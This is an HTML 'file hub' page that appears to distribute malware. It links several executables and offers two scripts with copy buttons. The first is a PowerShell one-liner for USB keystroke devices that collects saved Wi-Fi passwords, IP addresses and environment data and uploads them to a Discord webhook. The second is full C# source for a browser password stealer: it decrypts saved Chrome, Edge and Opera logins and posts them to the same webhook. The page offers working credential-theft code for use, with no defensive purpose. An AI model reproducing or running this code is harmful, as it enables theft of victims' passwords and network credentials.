<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ShadowBytes Epic File Hub</title>
  <link href="https://fonts.googleapis.com/css?family=Orbitron&display=swap" rel="stylesheet">
  <style>
    /* Basic reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      height: 100%;
      font-family: 'Orbitron', monospace;
      background: #1a1a1a;
      overflow-y: auto;
    }
    /* Particle background */
    #particles-js {
      position: fixed;
      width: 100%;
      height: 100%;
      background: #1a1a1a;
      z-index: 1;
    }
    /* Main container styling */
    .content {
      position: relative;
      margin: 50px auto;
      z-index: 2;
      width: 90%;
      max-width: 1000px;
      padding: 40px;
      background: rgba(0, 0, 0, 0.85);
      border: 1px solid #66cc66;
      border-radius: 10px;
      text-align: center;
      color: #66cc66;
    }
    .content h1 {
      margin-bottom: 30px;
      font-size: 2.5em;
    }
    .buttons {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      margin-bottom: 40px;
    }
    .buttons a {
      text-decoration: none;
    }
    .buttons button {
      background: transparent;
      border: 2px solid #66cc66;
      padding: 15px 30px;
      font-size: 1.2em;
      color: #66cc66;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.3s ease;
    }
    .buttons button:hover {
      background: rgba(102, 204, 102, 0.2);
      transform: scale(1.05);
    }
    /* Scripts Section */
    .scripts {
      text-align: left;
    }
    .scripts h2 {
      margin-bottom: 20px;
      font-size: 2em;
      color: #66cc66;
    }
    .script {
      margin-bottom: 30px;
    }
    .script h3 {
      margin-bottom: 10px;
      font-size: 1.5em;
      color: #66cc66;
    }
    .script textarea {
      width: 100%;
      height: 200px;
      background: #2b2b2b;
      color: #66cc66;
      border: 1px solid #66cc66;
      border-radius: 5px;
      padding: 10px;
      font-family: 'Orbitron', monospace;
      resize: none;
    }
    .script button {
      margin-top: 10px;
      background: transparent;
      border: 2px solid #66cc66;
      padding: 10px 20px;
      font-size: 1em;
      color: #66cc66;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.3s ease;
    }
    .script button:hover {
      background: rgba(102, 204, 102, 0.2);
      transform: scale(1.05);
    }
  </style>
</head>
<body>
  <!-- Particle background -->
  <div id="particles-js"></div>

  <!-- Main content -->
  <div class="content">
    <h1>Welcome to ShadowBytes Epic File Hub!</h1>
    <div class="buttons">
      <a href="https://bleh-xi.vercel.app/Charlottes%20App.exe">
        <button>Charlottes App.exe</button>
      </a>
      <a href="https://bleh-xi.vercel.app/Silly.zip">
        <button>Silly.zip</button>
      </a>
      <a href="https://bleh-xi.vercel.app/POWER.exe">
        <button>POWER.exe</button>
      </a>
      <!-- More file buttons can be added here -->
    </div>

    <!-- Scripts Section -->
    <div class="scripts">
      <h2>Scripts</h2>
      <!-- Wifi Script -->
      <div class="script">
        <h3>Wifi Script</h3>
        <textarea id="wifiScript" readonly>$url="https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit</textarea>
        <button onclick="copyScript('wifiScript')">Copy Wifi Script</button>
      </div>

      <!-- Passwords.cs Script -->
      <div class="script">
        <h3>Passwords.cs<br /><span style="font-size:0.8em; color:#aaa;">(call from load with await Pass.ExtractAndSendPasswordsAsync();)</span></h3>
        <textarea id="passwordsScript" readonly>
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Net.Http;
using Newtonsoft.Json;
using System.Data.SQLite;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;

namespace Big_Silly
{
    public static class Pass
    {
        // Replace with your actual Discord webhook URL.
        private const string WEBHOOK_URL = "https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5";

        /// <summary>
        /// Reads the Local State file for the given browser and returns the decrypted master key.
        /// </summary>
        public static byte[] GetMasterKey(string browser)
        {
            string localStatePath = string.Empty;
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            switch (browser.ToLower())
            {
                case "edge":
                    localStatePath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Local State");
                    break;
                case "chrome":
                    localStatePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Local State");
                    break;
                case "opera":
                    localStatePath = Path.Combine(userProfile, @"AppData\Roaming\Opera Software\Opera GX Stable\Local State");
                    break;
                default:
                    return null;
            }
            if (!File.Exists(localStatePath))
            {
                // Could log that the browser was not found.
                return null;
            }
            try
            {
                string jsonText = File.ReadAllText(localStatePath);
                dynamic localState = JsonConvert.DeserializeObject(jsonText);
                string encryptedKeyB64 = localState["os_crypt"]["encrypted_key"];
                byte[] encryptedKeyWithPrefix = Convert.FromBase64String(encryptedKeyB64);
                // Remove the first 5 bytes (the "DPAPI" prefix)
                byte[] encryptedKey = new byte[encryptedKeyWithPrefix.Length - 5];
                Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKey.Length);
                // Decrypt the master key using DPAPI
                byte[] masterKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                return masterKey;
            }
            catch (Exception)
            {
                // Log the error if needed.
                return null;
            }
        }

        /// <summary>
        /// Decrypts an individual password (stored as a blob) using the given master key.
        /// </summary>
        public static string DecryptPassword(byte[] encryptedData, byte[] masterKey)
        {
            try
            {
                // Validate the length: 3-byte prefix + 12-byte IV + (ciphertext + 16-byte tag) must be present.
                if (encryptedData == null || encryptedData.Length < (3 + 12 + 16))
                    return "";

                // Skip the first 3 bytes (prefix)
                int ivOffset = 3;
                int ivLength = 12;
                byte[] iv = new byte[ivLength];
                Array.Copy(encryptedData, ivOffset, iv, 0, ivLength);

                // Calculate the length of ciphertext (total length minus prefix, IV, and tag)
                int tagLength = 16;
                int cipherTextLength = encryptedData.Length - 3 - ivLength - tagLength;
                if (cipherTextLength <= 0)
                    return "";

                // Extract ciphertext
                byte[] cipherText = new byte[cipherTextLength];
                Array.Copy(encryptedData, ivOffset + ivLength, cipherText, 0, cipherTextLength);

                // Extract tag (last 16 bytes)
                byte[] tag = new byte[tagLength];
                Array.Copy(encryptedData, encryptedData.Length - tagLength, tag, 0, tagLength);

                // Combine ciphertext and tag in one array as expected by BouncyCastle.
                byte[] cipherTextWithTag = new byte[cipherTextLength + tagLength];
                Array.Copy(cipherText, 0, cipherTextWithTag, 0, cipherTextLength);
                Array.Copy(tag, 0, cipherTextWithTag, cipherTextLength, tagLength);

                // Set up the cipher using BouncyCastle.
                // Create an instance of the AES engine in GCM mode.
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                // 128-bit MAC size is standard for AES-GCM.
                AeadParameters parameters = new AeadParameters(new KeyParameter(masterKey), 128, iv, null);
                cipher.Init(false, parameters); // false for decryption

                // Prepare a buffer to hold the decrypted output.
                byte[] plainText = new byte[cipher.GetOutputSize(cipherTextWithTag.Length)];
                int len = cipher.ProcessBytes(cipherTextWithTag, 0, cipherTextWithTag.Length, plainText, 0);
                cipher.DoFinal(plainText, len);

                // Convert the decrypted bytes to a UTF8 string.
                return Encoding.UTF8.GetString(plainText).TrimEnd('\0');
            }
            catch (Exception ex)
            {
                // Optionally log the exception message.
                Console.WriteLine($"Password decryption failed: {ex.Message}");
                return "Decryption failed";
            }
        }

        /// <summary>
        /// Retrieves login credentials from the browser’s Login Data database.
        /// </summary>
        public static Dictionary<string, (string username, string password)> GetPasswords(string browser)
        {
            var passwords = new Dictionary<string, (string username, string password)>();
            byte[] masterKey = GetMasterKey(browser);
            if (masterKey == null)
                return passwords;

            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string loginDataPath = string.Empty;
            switch (browser.ToLower())
            {
                case "edge":
                    loginDataPath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default\Login Data");
                    break;
                case "chrome":
                    loginDataPath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default\Login Data");
                    break;
                case "opera":
                    loginDataPath = Path.Combine(userProfile, @"AppData\Roaming\Opera Software\Opera GX Stable\Login Data");
                    break;
                default:
                    return passwords;
            }
            if (!File.Exists(loginDataPath))
                return passwords;

            // Copy the locked database to a temporary file.
            string tempFile = Path.Combine(Path.GetTempPath(), "Loginvault.db");
            try
            {
                File.Copy(loginDataPath, tempFile, true);
            }
            catch (Exception)
            {
                // Log error copying the file if needed.
                return passwords;
            }

            try
            {
                using (var connection = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    connection.Open();
                    using (var command = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", connection))
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string url = reader.IsDBNull(0) ? "" : reader.GetString(0);
                            string username = reader.IsDBNull(1) ? "" : reader.GetString(1);
                            byte[] encryptedPassword = (byte[])reader["password_value"];
                            string decryptedPassword = DecryptPassword(encryptedPassword, masterKey);
                            if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(decryptedPassword))
                            {
                                passwords[url] = (username, decryptedPassword);
                            }
                        }
                    }
                    connection.Close();
                }
            }
            catch (Exception)
            {
                // Log query error if needed.
            }
            try
            {
                File.Delete(tempFile);
            }
            catch (Exception)
            {
                // Log deletion error if needed.
            }
            return passwords;
        }

        /// <summary>
        /// Sends the collected passwords as a text file to the Discord webhook.
        /// </summary>
        public static async Task SendToWebhookAsync(Dictionary<string, (string username, string password)> passwords)
        {
            if (passwords == null || passwords.Count == 0)
            {
                // Optionally log that no passwords were found.
                return;
            }
            StringBuilder sb = new StringBuilder();
            foreach (var kvp in passwords)
            {
                sb.AppendLine($"URL: {kvp.Key}");
                sb.AppendLine($"Username: {kvp.Value.username}");
                sb.AppendLine($"Password: {kvp.Value.password}");
                sb.AppendLine();
            }
            string content = sb.ToString();

            using (var client = new HttpClient())
            using (var form = new MultipartFormDataContent())
            {
                var fileContent = new StringContent(content, Encoding.UTF8, "text/plain");
                form.Add(fileContent, "file", "passwords.txt");

                HttpResponseMessage response = await client.PostAsync(WEBHOOK_URL, form);
                // Optionally check the response status.
            }
        }

        /// <summary>
        /// Extracts passwords from Chrome, Edge, and Opera and sends the combined report via webhook.
        /// </summary>
        public static async Task ExtractAndSendPasswordsAsync()
        {
            var allPasswords = new Dictionary<string, (string username, string password)>();
            foreach (var browser in new string[] { "chrome", "edge", "opera" })
            {
                var browserPasswords = GetPasswords(browser);
                foreach (var kvp in browserPasswords)
                {
                    // If the same URL exists for multiple browsers, the last one will overwrite.
                    allPasswords[kvp.Key] = kvp.Value;
                }
            }
            await SendToWebhookAsync(allPasswords);
        }
    }
}
        </textarea>
        <button onclick="copyScript('passwordsScript')">Copy Passwords.cs</button>
      </div>
    </div>
  </div>

  <!-- Particles.js library -->
  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
  <script>
    /* ParticlesJS Config */
    particlesJS("particles-js", {
      "particles": {
        "number": {
          "value": 80,
          "density": {
            "enable": true,
            "value_area": 800
          }
        },
        "color": {
          "value": "#66cc66"
        },
        "shape": {
          "type": "circle",
          "stroke": {
            "width": 0,
            "color": "#000000"
          },
          "polygon": {
            "nb_sides": 5
          }
        },
        "opacity": {
          "value": 0.5,
          "random": false,
          "anim": {
            "enable": false,
            "speed": 1,
            "opacity_min": 0.1,
            "sync": false
          }
        },
        "size": {
          "value": 3,
          "random": true,
          "anim": {
            "enable": false,
            "speed": 40,
            "size_min": 0.1,
            "sync": false
          }
        },
        "line_linked": {
          "enable": true,
          "distance": 150,
          "color": "#66cc66",
          "opacity": 0.4,
          "width": 1
        },
        "move": {
          "enable": true,
          "speed": 6,
          "direction": "none",
          "random": false,
          "straight": false,
          "out_mode": "out",
          "attract": {
            "enable": false,
            "rotateX": 600,
            "rotateY": 1200
          }
        }
      },
      "interactivity": {
        "detect_on": "canvas",
        "events": {
          "onhover": {
            "enable": true,
            "mode": "repulse"
          },
          "onclick": {
            "enable": true,
            "mode": "grab"
          },
          "resize": true
        },
        "modes": {
          "grab": {
            "distance": 400,
            "line_linked": {
              "opacity": 1
            }
          },
          "bubble": {
            "distance": 100,
            "size": 40,
            "duration": 2,
            "opacity": 8,
            "speed": 3
          },
          "repulse": {
            "distance": 100,
            "duration": 0.4
          },
          "push": {
            "particles_nb": 4
          },
          "remove": {
            "particles_nb": 2
          }
        }
      },
      "retina_detect": true
    });

    // Function to copy script content to clipboard
    function copyScript(id) {
      const copyText = document.getElementById(id);
      copyText.select();
      copyText.setSelectionRange(0, 99999); // For mobile devices
      navigator.clipboard.writeText(copyText.value).then(() => {
        alert("Script copied to clipboard!");
      }, (err) => {
        alert("Failed to copy the script.");
      });
    }
  </script>
</body>
</html>
